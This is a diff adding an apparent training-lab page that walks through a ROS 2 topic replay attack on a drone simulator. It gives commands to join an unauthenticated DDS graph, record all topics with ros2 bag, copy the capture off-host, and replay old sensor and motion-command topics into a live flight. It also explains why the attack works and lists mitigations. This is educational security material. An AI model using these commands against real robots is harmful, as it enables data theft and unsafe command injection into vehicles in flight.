@@ -1,0 +1,140 @@
+title: ROS 2 Topic Replay
+order: 7
+description: Record the live ROS 2 graph with ros2 bag, then replay the captures offline or back into the live graph for a confused-state attack.
+breadcrumb:
+  - text: Attack Scenarios
+    link: /attacks
+  - text: Exfiltration
+  - text: ROS 2 Topic Replay
+
+sections:
+  - title: Description
+    content: |
+      `ros2 bag` is the standard ROS 2 logging tool — it records selected (or all) topics to a SQLite or
+      MCAP bag file, and can replay them later either against an isolated graph or against the same graph
+      they were recorded from.
+
+      In an unauthenticated graph, anyone on the domain can run `ros2 bag record -a`. The bag captures:
+        - Every sensor topic (camera frames, GPS fix, IMU, etc.)
+        - Every command topic
+        - Every state/telemetry topic
+
+      This walkthrough demonstrates both halves of the attack:
+        1. **Exfiltration**: record a full flight's worth of telemetry and sensor data with no special privilege.
+        2. **Confused-state**: replay the bag back into the live graph during a later flight. Subscribers that
+           don't deduplicate by timestamp or sequence will see two streams interleaved — yesterday's flight
+           and today's — and may produce undefined behaviour.
+
+      A note on this scenario versus the originally-scoped SROS 2 walkthrough: on the `ros2-migration` branch
+      we elected to ship the Topic Replay scenario instead of SROS 2 Permission File Theft. SROS 2 requires
+      build-time keystore generation, permission XML authoring, and live validation that's hard to do without
+      a working lab. Topic Replay is a real and important attack against unsecured ROS 2 deployments, and it
+      works against the lab as-is with no companion-computer changes.
+
+  - title: Resources
+    content:
+      - text: ros2 bag docs
+        link: https://docs.ros.org/en/humble/Tutorials/Beginner-CLI-Tools/Recording-And-Playing-Back-Data/Recording-And-Playing-Back-Data.html
+      - text: MCAP file format
+        link: https://mcap.dev/
+
+  - title: Solution Guide
+    collapsible: true
+    steps:
+      - title: Step 1. Stand up an attacker container on the simulator network
+        description: |
+          ```docker pull osrf/ros:humble-desktop
+          docker run -it --network=simulator --ip=10.13.0.10 \
+              -v /tmp/dvd-bags:/bags \
+              --name ros_humble_bagger osrf/ros:humble-desktop bash
+          ```
+
+          The `-v` bind mount lets you carry the bag file back to the host afterwards.
+
+      - title: Step 2. Join the lab's DDS graph
+        description: |
+          ```apt-get update && apt-get install -y ros-humble-rmw-cyclonedds-cpp
+          cat > /etc/cyclonedds.xml <<'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <CycloneDDS xmlns="https://cdds.io/config">
+            <Domain id="any">
+              <General>
+                <AllowMulticast>false</AllowMulticast>
+              </General>
+              <Discovery>
+                <Peers>
+                  <Peer address="10.13.0.3"/>
+                  <Peer address="10.13.0.5"/>
+                </Peers>
+              </Discovery>
+            </Domain>
+          </CycloneDDS>
+          EOF
+          export ROS_DOMAIN_ID=42
+          export RMW_IMPLEMENTATION=rmw_cyclonedds_cpp
+          export CYCLONEDDS_URI=file:///etc/cyclonedds.xml
+          source /opt/ros/humble/setup.bash
+          ```
+
+      - title: Step 3. Record everything
+        description: |
+          From the management web console, start a mission ("Arm & Takeoff" then "Autopilot Flight"). Then,
+          inside the attacker container:
+          ```cd /bags
+          ros2 bag record -a --output mission-$(date +%s) --storage mcap
+          ```
+
+          `-a` records every topic that has at least one publisher. The MCAP storage format is more compact
+          than the default SQLite and is the standard for ROS 2 bags in 2025+.
+
+          Let the recording run for the duration of the flight. Stop with `Ctrl+C` when the drone lands.
+
+      - title: Step 4. Inspect the bag
+        description: |
+          ```ros2 bag info mission-*
+          ```
+          You'll get a topic-by-topic breakdown: count, frequency, message type, and total bytes. You should
+          see `/webcam/image_raw` with several thousand messages (10 Hz x flight duration), plus whatever
+          telemetry topics the companion publishes.
+
+      - title: Step 5. Offline analysis (the pure exfiltration use case)
+        description: |
+          Take the bag back to your Kali host:
+          ```docker cp ros_humble_bagger:/bags/mission-*.mcap ~/mission.mcap
+          ```
+
+          You can now replay against a private graph (a separate Docker network or a different DOMAIN_ID),
+          dump frames to disk, or feed it into Foxglove Studio for visualisation:
+          ```ros2 bag play ~/mission.mcap --remap /webcam/image_raw:=/replay/image_raw
+          ros2 run image_view image_saver --ros-args -r image:=/replay/image_raw
+          ```
+
+      - title: Step 6. The confused-state attack (replay into the live graph)
+        description: |
+          Wait until a new mission is in progress, then in the attacker container:
+          ```ros2 bag play mission-*.mcap --rate 1.0
+          ```
+
+          The replay re-injects the previous flight's `/webcam/image_raw`, telemetry, and any command topics
+          captured. Subscribers that don't filter by timestamp will see today's flight interleaved with
+          yesterday's. The companion's RTSP republisher will flicker between live frames and replayed frames.
+
+          A more nuanced variant: replay only command topics (`--topic /cmd_vel` for a navigation stack) to
+          inject old motion commands into a new flight without touching sensor topics.
+
+      - title: Why this works
+        description: |
+          The default ROS 2 stack has no authentication on publish, and no message-level timestamps or nonces
+          that subscribers are required to validate. `ros2 bag play` re-publishes captured messages with
+          their original headers, so to a subscriber the replay is indistinguishable from a fresh stream.
+
+          Mitigations require either (a) SROS 2 with strict permissions limiting who can publish each topic
+          — and even then, an attacker who has compromised a legitimate node still has its credentials —
+          or (b) application-level replay protection, which is rare in robotics middleware.
+
+      - title: Why this is also the dominant exfiltration attack in practice
+        description: |
+          Even an attacker who only ever reads — never publishes — can produce a complete dump of the robot's
+          sensor and telemetry data with one command and zero special privilege. There is no rate limit, no
+          audit trail at the middleware layer, and no per-topic permission. The bag format is designed to be
+          portable, so once exfiltrated it can be analysed offline at leisure, or shipped to a third party.
